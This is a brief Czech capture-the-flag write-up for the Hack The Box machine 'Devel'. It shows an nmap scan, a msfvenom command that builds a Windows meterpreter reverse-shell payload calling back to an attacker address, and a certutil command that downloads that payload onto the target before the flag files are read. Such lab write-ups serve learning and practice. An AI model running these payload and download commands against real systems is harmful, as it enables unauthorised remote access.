[Devel](https://www.hackthebox.eu/home/machines/profile/3) je stroj z Hack The Box. Cílem je přejít od prvotní enumerace až k plnému ovládnutí systému.

### Vyhledání otevřených portů
Nejdřív mapuji služby, které jsou dostupné zvenku.
`IP=10.10.10.5;ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);nmap -p $ports -A -sC -sV -v $IP`

### Spuštění exploitu
Zde dochází k praktickému zneužití zranitelnosti.
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o test.exe`
```
certutil.exe -urlcache -split -f http://10.10.14.5:8000/exe/test.exe c:\programdata\test.exe
```

### Získání user flagu
Tímto potvrzuji úspěšný uživatelský přístup.
`type user.txt.txt`
```
__CENSORED__
```

### Získání root flagu
Tímto potvrzuji úplné ovládnutí stroje.
`type root.txt.txt`
```

```
